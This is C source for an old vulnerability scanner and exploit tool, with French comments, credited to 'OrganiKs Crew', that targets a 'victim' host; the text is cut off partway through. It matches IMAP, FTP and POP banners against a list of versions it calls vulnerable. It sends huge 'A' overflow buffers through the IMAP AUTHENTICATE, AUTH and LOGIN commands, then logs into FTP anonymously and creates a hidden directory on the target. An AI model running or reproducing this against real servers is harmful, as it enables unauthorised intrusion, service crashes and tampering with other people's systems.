/*
 * OrganiKs Crew Scan exploit ver. 1.0 by Lionel
 */
#include <stdio.h>
#include <stdarg.h>
#include <unistd.h>
#include <stdlib.h> 
#include <sys/time.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netdb.h>

int connect_tcp(struct in_addr addr,unsigned short port);
int fdprintf(int dafd,char *fmt,...);

char overflow[] =
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
char overflow2[] =
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
struct types {
  char *name;
};

struct types types[]={
			{"IMAP4rev1 9.0"}, 
			{"IMAP4rev1 v10.190"},
			{"IMAP4rev1 v10.223"},
			{"IMAP4rev1 v10.203"},
			{"IMAP4 Service 8.3"}, 
                        {"BETA-18"},
                        {"BETA-16"},
                        {"BETA-15"},
                        {"1.2.0pre1"},
                        {"2.4"},
                        {"QPOP"},
                        {"POP2"},
			{NULL}
                     };

struct over {
  char *name;
};

struct over over[]={
			{"AUTHENTICATE"}, 
			{NULL}
                     };

struct in_addr victim;
/*
int cgit(vict)
unsigned long vict;
{
cgi(vict);
 return(-1);
} 
*/
int main (int argc,char **argv)
{
char recvbuf[1024];
char recvbuf2[5000];
char recvbuf3[200000];

int sockfd,scan;
int cgitest;
int i,n=0; 
char ftp[1024];
char nmap[1024];
char hostl[1024];
char dig[1024];
char trace[1024];
char rpc[5000];
char rpc0[5000];
char rpc01[5000];
char rpc1[5000];
char rpc2[5000];
char rpc3[5000];
char rpc31[5000];
char rpc32[5000];
char rpc4[5000];
char rpc5[5000];
char rpc51[5000];
char rpc52[5000];
char rpc53[5000];
char rpc54[5000];
char rpc6[5000];
char named[400];
char cgi[400];
char s1[400];
char s2[400];
char s3[400];
char s4[400];
char s5[400];

printf("_________________________________________________\n");
printf("|--=====**********OrganiKs Crew**********=====--|\n");
printf("|          Scan Vulnerabilit�es by Lionel       |\n");
printf("|_______________________________________________|\n");

if (argc != 2)
{
  printf("Usage: %s <hostname>\n",argv[0]);
  exit(0);
}
printf("==============================================================\n");
printf("Teste Vuln.      on [%s] \n" , argv[1]);
printf("-=Scanning=-    -=> [%s] \n" , argv[1]);
printf("==============================================================\n");

/* gethostname */
if (!host_to_ip(argv[1],&victim))
{
  fprintf(stderr,"Erreur de resolution hostname\n");
  exit(0);
}
/* good */

/* imap */
if ((sockfd=connect_tcp(victim,143)) < 0)
{
printf("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n");
  printf("---imap service ferm�---\n");
}
if ((sockfd=connect_tcp(victim,143)) > 0)
{
printf("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n");
  printf("--===imap service ouvert===--\n");
bzero(recvbuf,sizeof(recvbuf));
n=read(sockfd,recvbuf,1024);
if (n <= 0) {
  fprintf(stderr,"Connection ferm� sur imapd\n");
}
for (i=0;;i++)
{
  if (types[i].name==NULL)
  {
    i=0;
    break;
  }
  if (strstr(recvbuf,types[i].name))
    break;
}
printf("-------------------------------------------------------------\n");
printf("IMAP est vulnerable:\n");
printf("-------------------------------------------------------------\n");
if (i == 1) {
printf("IMAP4rev est vulnerable\n");
}
if (i == 2) {
printf("IMAP4rev est vulnerable\n");
}
if (i == 3) {
printf("IMAP4rev est vulnerable\n");
}
if (i == 4) {
printf("IMAP4rev est vulnerable\n");
}
if (i == 5) {
printf("IMAP4rev est vulnerable\n");
}
printf("-------------------------------------------------------------\n");
}
if (i == 0) {
if ((sockfd=connect_tcp(victim,143)) > 0)
{
printf("Version non Vulnerable donc => Teste Buffer overflows:\n");
printf("-------------------------------------------------------------\n");
printf("IMAP4rev n'est pas vulnerable\n");
printf("Test buffer overflow on imap, cmd: AUTH , LOGIN , AUTHENTICATE \n");
fdprintf(sockfd,"* AUTHENTICATE {%d}\n",strlen(overflow2));
fdprintf(sockfd,"%s\r\n",overflow2);
fdprintf(sockfd,"{%d} AUTH\r\n %s\r\n",sizeof(overflow2), overflow2);
fdprintf(sockfd,"%d LOGIN \"%s\" pass\n",sizeof(overflow2), overflow2);
bzero(recvbuf3,sizeof(recvbuf3));
n=read(sockfd,recvbuf3,sizeof(recvbuf3));
if (n <= 0) {
  printf("imap possible overflowed! ou imap service close?\n");
}
else {
printf("imap no overflowed\n");
 }
}
}
printf("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n");
/* fin imap */

/* wuftp */

if ((sockfd=connect_tcp(victim,21)) < 0)
{
printf("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n");
  printf("---service ftpd ferm�---\n");
}
if ((sockfd=connect_tcp(victim,21)) > 0)
{
printf("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n");
  printf("--===service ftpd ouvert===--\n");
bzero(recvbuf,sizeof(recvbuf));
n=read(sockfd,recvbuf,sizeof(recvbuf));
printf("Ftpd version\n");
printf("-------------------------------------------------------------\n");
printf("%s\n",recvbuf);
printf("-------------------------------------------------------------\n");
for (i=0;;i++)
{
  if (types[i].name==NULL)
  {
    i=0;
    break;
  }
  if (strstr(recvbuf,types[i].name))
    break;
}
printf("Ftpd Is vulnerable or No Vulnerable?\n");
printf("-------------------------------------------------------------\n");
if (i == 0) {
printf("wuftp n'est pas vulnerable\n");
}
if (i == 6) {
printf("wuftp est vulnerable\n");
}
if (i == 7) {
printf("wuftp est vulnerable\n");
}
if (i == 8) {
printf("wuftp est vulnerable\n");
}
if (i == 9) {
printf("wuftp est vulnerable\n");
}
if (i == 10) {
printf("wuftp est vulnerable\n");
}
printf("-------------------------------------------------------------\n");
}
if ((sockfd=connect_tcp(victim,21)) > 0)
{
printf("STAT sur FTP:\n");
printf("-------------------------------------------------------------\n");
sleep(1);
fdprintf(sockfd,"USER anonymous\n");
sleep(1);
fdprintf(sockfd,"PASS anonymous\n");
sleep(1);
fdprintf(sockfd,"STAT\n");
sleep(1);
fdprintf(sockfd,"MKD .fo\n");
sleep(2);
bzero(recvbuf2,sizeof(recvbuf2));
n=read(sockfd,recvbuf2,sizeof(recvbuf2));
if (n <= 0) {
  fprintf(stderr,"Connection ferm� sur Ftpd\n");
}
